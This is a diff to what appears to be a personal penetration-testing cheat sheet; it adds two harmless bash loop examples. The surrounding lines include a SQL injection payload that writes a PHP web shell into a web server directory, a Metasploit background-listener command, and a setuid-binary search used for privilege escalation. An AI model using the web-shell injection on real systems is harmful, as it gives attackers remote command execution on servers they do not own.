@@ -87,6 +87,14 @@ Adding a php rce file using union based sqli:
 ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'
 
 
+Run something in for loop linux bash:
+for i in {1..10}; do echo -n "This is a test in loop $i "; date ; sleep 5; done
+
+
+Run something in while loop linux bash:
+while true; do echo -n "This is a test of while loop";date ; sleep 5; done
+
+
 exploit -j #for runnung a listner in background in msfconsole
 
 find / -perm -4000 2>/dev/null #look for setuid binaries 
